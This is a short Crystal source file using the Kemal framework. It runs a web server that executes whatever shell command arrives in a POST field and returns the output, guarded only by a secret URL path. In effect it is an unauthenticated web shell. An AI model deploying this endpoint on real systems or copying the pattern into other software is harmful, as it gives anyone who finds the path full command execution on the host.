require "kemal"

# @source https://stackoverflow.com/questions/47050208/running-shell-commands-crystal-language-and-capturing-the-output
def execute_command(cmd : String)
  stdout = IO::Memory.new
  stderr = IO::Memory.new
  status = Process.run(cmd, shell: true, output: stdout, error: stderr)

  if status.success?
    {stdout.to_s.chomp, true}
  else
    {nil, false}
  end
end

post "/#{ENV["SECRET"]?}" do |env|
  result, ok = execute_command(env.params.body["cmd"])
  if ok
    env.response.content_type = "application/json"
    {success: true, result: result}.to_json
  else
    {success: false}.to_json
  end
end

ENV["PORT"] ||= "5000"
Kemal.run(ENV["PORT"].to_i)